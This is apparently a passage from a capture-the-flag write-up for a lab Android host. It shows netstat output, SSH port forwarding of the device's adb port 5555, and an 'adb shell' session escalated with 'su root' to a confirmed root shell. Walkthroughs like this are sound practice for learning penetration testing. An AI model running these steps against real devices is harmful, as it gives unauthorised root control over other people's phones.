```bash
:/sdcard $ netstat -tunlp |grep LIST  
tcp        0      0 127.0.0.1:5037          0.0.0.0:*               LISTEN      -  
tcp        0      0 127.0.0.1:5554          0.0.0.0:*               LISTEN      31429/ssh  
tcp6       0      0 :::59777                :::*                    LISTEN      -  
tcp6       0      0 ::ffff:10.10.10.2:45833 :::*                    LISTEN      -  
tcp6       0      0 ::ffff:127.0.0.1:41613  :::*                    LISTEN      -  
tcp6       0      0 :::2222                 :::*                    LISTEN      3402/net.xnano.android.sshserver  
tcp6       0      0 ::1:5554                :::*                    LISTEN      31429/ssh  
tcp6       0      0 :::5555                 :::*                    LISTEN      -  
tcp6       0      0 :::42135                :::*                    LISTEN      -
```

Port 5555 is open and listening for connections
I know for a fact that 5555 is tcp port for adb

Lets forward this port to our machine using SSH and try to connect to it via adb
```bash
$ ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555

$ netstat -tunlp |grep LIST  
[REDACTED]
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      18108/ssh   
[REDACTED]
```

Now connect to adb with `adb shell`

```bash
$ adb shell
x86_64:/ $ su root
x86_64:/ # whoami;id;hostname
root  
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),300  
2(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0  
localhost
```
